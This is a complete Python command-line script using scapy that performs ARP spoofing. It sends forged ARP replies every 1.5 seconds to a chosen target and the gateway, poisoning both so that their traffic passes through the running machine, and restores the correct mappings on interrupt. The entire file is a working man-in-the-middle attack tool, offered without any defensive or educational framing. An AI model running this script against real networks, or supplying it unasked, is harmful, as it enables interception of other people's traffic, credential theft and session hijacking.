from scapy.all import *
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.sendrecv import sendp, send
import getmac


def spoof(native_mac, target_mac, gateway_mac):
    # Specify the ARP source MAC address to prevent using the wrong interface MAC address
    sendp(Ether(src=native_mac, dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=native_mac, pdst=target_ip, hwdst=target_mac), iface=interface)
    sendp(Ether(src=native_mac, dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=native_mac, pdst=gateway_ip, hwdst=gateway_mac), iface=interface)


# Restore when arpspoof is done
def restore(target_mac, gateway_mac):
    restore_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
    restore_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac)
    send(restore_target)
    send(restore_gateway)


def show_help():
    print("\nUsage:\n python3 arpspoof.py target_ip gateway_ip interface\n")
    sys.exit()


def run():
    if os.geteuid() != 0:
        print("Root required for operation")
        sys.exit(1)
    # Get the native MAC by specified interface
    native_mac = getmac.get_mac_address(interface)
    if not native_mac:
        print("The specified interface does not exist")
        sys.exit()
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        print("The specified target does not exist")
        sys.exit()
    gateway_mac = getmacbyip(gateway_ip)
    if not gateway_mac:
        print("The specified gateway does not exist")
        sys.exit()
    while 1:
        try:
            spoof(native_mac, target_mac, gateway_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            restore(target_mac, gateway_mac)
            break


if __name__ == '__main__':
    if len(sys.argv) < 2:
        show_help()
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]
    run()
